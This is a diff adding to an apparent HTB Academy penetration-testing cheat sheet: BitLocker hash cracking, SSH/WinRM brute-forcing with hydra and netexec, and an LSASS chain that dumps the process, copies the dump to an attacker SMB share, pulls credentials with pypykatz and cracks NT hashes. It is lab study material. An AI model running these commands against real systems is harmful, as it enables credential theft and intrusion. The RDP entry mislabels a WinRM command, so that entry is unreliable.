@@ -81,3 +81,36 @@ xfreerdp /v:STMIP /u:htb-student /p:HTB_@cademy_stdnt!
 
 ## Find shell
 find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
+
+## Password Craking
+
+### BitLocker
+bitlocker2john -i Backup.vhd > backup.hashes
+grep "bitlocker\$0" backup.hashes > backup.hash
+hashcat -a 0 -m 22100 '$bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$1048576$12$00b0a67f961dd80103000000$60$d59f37e70696f7eab6b8f95ae93bd53f3f7067d5e33c0394b3d8e2d1fdb885cb86c1b978f6cc12ed26de0889cd2196b0510bbcd2a8c89187ba8ec54f' /usr/share/wordlists/rockyou.txt
+
+### WinRM
+netexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
+
+### ssh
+hydra -L user.list -P password.list ssh://10.129.42.197
+
+### RDP
+netexec winrm <ip> -u user.list -p password.list
+
+### Default Credentials
+https://raw.githubusercontent.com/ihebski/DefaultCreds-cheat-sheet/main/DefaultCreds-Cheat-Sheet.csv
+
+## Attacking LSASS
+### Creatting dump file on powershell
+PS C:\Windows\system32> Get-Process lsass # To check PID
+PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full 
+### Download from target
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/ # Attacking machine
+PS C:\Windows\system32> move C:\lsass.dmp \\10.10.14.184\CompData # Target machine
+### Extract Credential
+pypykatz lsa minidump /home/peter/Documents/lsass.dmp 
+### Cracking the NT Hash
+sudo hashcat -m 1000 <NT Hash> /usr/share/wordlists/rockyou.txt
+
+
